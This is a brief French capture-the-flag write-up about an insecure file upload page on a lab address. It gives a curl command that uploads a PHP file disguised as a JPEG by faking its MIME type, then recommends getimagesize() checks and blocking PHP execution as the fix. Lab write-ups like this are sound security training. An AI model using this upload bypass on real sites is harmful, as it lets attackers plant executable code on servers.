# Vulnérabilité

Page file upload: `http://192.168.1.19/index.php?page=upload`

Il suffit de faire une requête curl pour uploader un fichier .php en lui faisant croire que c'est une image

`curl -X POST -H 'Content-Type: multipart/form-data' --form 'Upload=Upload' --form 'uploaded=@test.php;type=image/jpeg' 'http://192.168.1.19/index.php?page=upload'`

et on obtient le flag dans le code html de la page

# Solution

Pour patcher cette faille, il suffit de vérifier que le fichier qu'on upload est bien une image, on peut utiliser la fonction `getimagesize()` pour obtenir des informations sur le fichier uploadé et avoir le type MIME du fichier et vérifier que ça correpond bien à une image, de plus il faut empêcher l'exécution des fichiers php ou autre
